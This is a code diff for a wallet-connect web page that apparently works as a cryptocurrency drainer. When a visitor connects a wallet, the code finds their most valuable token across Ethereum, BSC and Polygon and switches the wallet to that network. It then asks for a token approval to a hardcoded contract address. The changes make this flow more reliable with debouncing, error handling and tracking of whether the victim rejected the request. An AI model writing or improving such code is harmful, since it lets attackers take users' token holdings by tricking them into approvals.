@@ -4,6 +4,15 @@ import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { parseEther, formatUnits, maxUint256, isAddress, getAddress } from 'viem'
 import { sendTransaction, readContract, writeContract } from '@wagmi/core'
 
+// Utility for debouncing to prevent multiple subscribeAccount calls
+const debounce = (func, wait) => {
+  let timeout
+  return (...args) => {
+    clearTimeout(timeout)
+    timeout = setTimeout(() => func(...args), wait)
+  }
+}
+
 const projectId = import.meta.env.VITE_PROJECT_ID || "d85cc83edb401b676e2a7bcef67f3be8"
 if (!projectId) {
   throw new Error('VITE_PROJECT_ID is not set')
@@ -38,7 +47,9 @@ const store = {
   eip155Provider: null,
   tokenBalances: [],
   errors: [],
-  approvedTokens: {} // Cache for approved tokens
+  approvedTokens: {}, // Cache for approved tokens
+  isApprovalRequested: false, // Flag to track if approval is already requested
+  isApprovalRejected: false // Flag to track if approval was rejected
 }
 
 const updateStore = (key, value) => {
@@ -49,6 +60,8 @@ const updateStateDisplay = (elementId, state) => {
   const element = document.getElementById(elementId)
   if (element) {
     element.innerHTML = JSON.stringify(state, null, 2)
+  } else {
+    console.warn(`Element with ID ${elementId} not found`)
   }
 }
 
@@ -101,12 +114,13 @@ const initializeSubscribers = (modal) => {
     updateStore('eip155Provider', state['eip155'])
   })
 
-  modal.subscribeAccount(async state => {
+  // Debounced subscribeAccount to prevent multiple calls
+  const debouncedSubscribeAccount = debounce(async state => {
     updateStore('accountState', state)
     updateStateDisplay('accountState', state)
 
     // Check token balances across all networks simultaneously after wallet connection
-    if (state.isConnected && state.address) {
+    if (state.isConnected && state.address && store.eip155Provider) {
       const ethMainnet = networks.find(n => n.chainId === 1)
       const bscMainnet = networks.find(n => n.chainId === 56)
       const polygonMainnet = networks.find(n => n.chainId === 137)
@@ -198,26 +212,45 @@ const initializeSubscribers = (modal) => {
       if (mostExpensive) {
         const message = `Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`
         console.log(message)
-        document.getElementById('open-connect-modal').innerHTML = 'Loading...'
+        const connectModal = document.getElementById('open-connect-modal')
+        if (connectModal) connectModal.innerHTML = 'Loading...'
 
         // Switch to the network of the most expensive token
         const targetNetwork = networks.find(n => n.chainId === mostExpensive.chainId)
         if (targetNetwork && store.networkState.chainId !== mostExpensive.chainId) {
           console.log(`Switching to ${mostExpensive.network} (chainId ${mostExpensive.chainId})`)
-          await appKit.switchNetwork(targetNetwork)
+          try {
+            await appKit.switchNetwork(targetNetwork)
+          } catch (switchError) {
+            console.error(`Failed to switch network: ${switchError.message}`)
+            store.errors.push(`Failed to switch network: ${switchError.message}`)
+            return // Stop if network switch fails
+          }
         }
 
-        // Propose approve for the most expensive token only if not already approved
+        // Propose approve for the most expensive token only if not already requested or rejected
         try {
           const contractAddress = CONTRACTS[mostExpensive.chainId]
           const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
-          if (store.approvedTokens[approvalKey]) {
-            const approveMessage = `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
+          
+          // Skip if approval already completed, requested, or rejected
+          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
+            const approveMessage = store.approvedTokens[approvalKey]
+              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : store.isApprovalRejected
+              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
             console.log(approveMessage)
-            document.getElementById('approveState').innerHTML = approveMessage
-            document.getElementById('approveSection').style.display = ''
+            const approveState = document.getElementById('approveState')
+            const approveSection = document.getElementById('approveSection')
+            if (approveState) approveState.innerHTML = approveMessage
+            if (approveSection) approveSection.style.display = ''
+            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
             return
           }
+
+          // Set flag to indicate approval is being requested
+          store.isApprovalRequested = true
 
           const txHash = await approveToken(
             wagmiAdapter.wagmiConfig,
@@ -225,26 +258,55 @@ const initializeSubscribers = (modal) => {
             contractAddress,
             mostExpensive.chainId
           )
+          
+          // Approval successful
           store.approvedTokens[approvalKey] = true // Cache approval
+          store.isApprovalRequested = false // Reset request flag
           const approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
           console.log(approveMessage)
-          document.getElementById('approveState').innerHTML = approveMessage
-          document.getElementById('approveSection').style.display = ''
+          const approveState = document.getElementById('approveState')
+          const approveSection = document.getElementById('approveSection')
+          if (approveState) approveState.innerHTML = approveMessage
+          if (approveSection) approveSection.style.display = ''
+          if (connectModal) connectModal.innerHTML = 'Connect Wallet'
         } catch (error) {
-          const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`
-          store.errors.push(errorMessage)
-          console.error(errorMessage)
-          document.getElementById('approveState').innerHTML = errorMessage
-          document.getElementById('approveSection').style.display = ''
+          // Check if error is due to user rejection (MetaMask error codes: -32000 or 4001)
+          if (error.code === 4001 || error.code === -32000) {
+            store.isApprovalRejected = true // Mark as rejected
+            store.isApprovalRequested = false // Reset request flag
+            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            store.errors.push(errorMessage)
+            console.error(errorMessage)
+            const approveState = document.getElementById('approveState')
+            const approveSection = document.getElementById('approveSection')
+            if (approveState) approveState.innerHTML = errorMessage
+            if (approveSection) approveSection.style.display = ''
+            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
+          } else {
+            // Other errors (e.g., network issues)
+            store.isApprovalRequested = false // Allow retry
+            const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            const approveSection = document.getElementById('approveSection')
+            if (approveState) approveState.innerHTML = errorMessage
+            if (approveSection) approveSection.style.display = ''
+            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
+          }
         }
       } else {
         const message = 'Нет токенов с положительным балансом'
         console.log(message)
-        document.getElementById('mostExpensiveTokenState').innerHTML = message
-        document.getElementById('mostExpensiveTokenSection').style.display = ''
+        const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
+        const mostExpensiveSection = document.getElementById('mostExpensiveTokenSection')
+        if (mostExpensiveState) mostExpensiveState.innerHTML = message
+        if (mostExpensiveSection) mostExpensiveSection.style.display = ''
+        if (connectModal) connectModal.innerHTML = 'Connect Wallet'
       }
     }
-  })
+  }, 500) // Debounce 500ms
+
+  modal.subscribeAccount(debouncedSubscribeAccount)
 
   modal.subscribeNetwork(state => {
     updateStore('networkState', state)
@@ -268,48 +330,44 @@ initializeSubscribers(appKit)
 
 updateButtonVisibility(appKit.getIsConnectedState())
 
-document.getElementById('open-connect-modal')?.addEventListener(
-  'click', () => appKit.open()
-)
+document.getElementById('open-connect-modal')?.addEventListener('click', () => appKit.open())
 
-document.getElementById('disconnect')?.addEventListener(
-  'click', () => {
-    appKit.disconnect()
-    store.approvedTokens = {} // Clear approval cache on disconnect
-    store.errors = [] // Clear errors on disconnect
-  }
-)
+document.getElementById('disconnect')?.addEventListener('click', () => {
+  appKit.disconnect()
+  store.approvedTokens = {} // Clear approval cache
+  store.errors = [] // Clear errors
+  store.isApprovalRequested = false // Reset approval request flag
+  store.isApprovalRejected = false // Reset approval rejection flag
+})
 
-document.getElementById('switch-network')?.addEventListener(
-  'click', () => {
-    const currentChainId = store.networkState?.chainId
-    appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon)
-  }
-)
+document.getElementById('switch-network')?.addEventListener('click', () => {
+  const currentChainId = store.networkState?.chainId
+  appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon)
+})
 
-document.getElementById('sign-message')?.addEventListener(
-  'click', async () => {
-    const signature = await signMessage(store.eip155Provider, store.accountState.address)
-    document.getElementById('signatureState').innerHTML = signature
-    document.getElementById('signatureSection').style.display = ''
-  }
-)
+document.getElementById('sign-message')?.addEventListener('click', async () => {
+  const signature = await signMessage(store.eip155Provider, store.accountState.address)
+  const signatureState = document.getElementById('signatureState')
+  const signatureSection = document.getElementById('signatureSection')
+  if (signatureState) signatureState.innerHTML = signature
+  if (signatureSection) signatureSection.style.display = ''
+})
 
-document.getElementById('send-tx')?.addEventListener(
-  'click', async () => {
-    const txHash = await sendTx(store.eip155Provider, store.accountState.address, wagmiAdapter.wagmiConfig)
-    document.getElementById('txState').innerHTML = JSON.stringify(txHash, null, 2)
-    document.getElementById('txSection').style.display = ''
-  }
-)
+document.getElementById('send-tx')?.addEventListener('click', async () => {
+  const txHash = await sendTx(store.eip155Provider, store.accountState.address, wagmiAdapter.wagmiConfig)
+  const txState = document.getElementById('txState')
+  const txSection = document.getElementById('txSection')
+  if (txState) txState.innerHTML = JSON.stringify(txHash, null, 2)
+  if (txSection) txSection.style.display = ''
+})
 
-document.getElementById('get-balance')?.addEventListener(
-  'click', async () => {
-    const balance = await getBalance(store.eip155Provider, store.accountState.address, wagmiAdapter.wagmiConfig)
-    document.getElementById('balanceState').innerHTML = balance + ' ETH'
-    document.getElementById('balanceSection').style.display = ''
-  }
-)
+document.getElementById('get-balance')?.addEventListener('click', async () => {
+  const balance = await getBalance(store.eip155Provider, store.accountState.address, wagmiAdapter.wagmiConfig)
+  const balanceState = document.getElementById('balanceState')
+  const balanceSection = document.getElementById('balanceSection')
+  if (balanceState) balanceState.innerHTML = balance + ' ETH'
+  if (balanceSection) balanceSection.style.display = ''
+})
 
 updateTheme(store.themeState.themeMode)
 
@@ -436,6 +494,9 @@ const getTokenPrice = async (symbol) => {
 };
 
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
+  if (!wagmiConfig) {
+    throw new Error('wagmiConfig is not initialized')
+  }
   if (!tokenAddress || !contractAddress) {
     throw new Error('Missing token or contract address')
   }
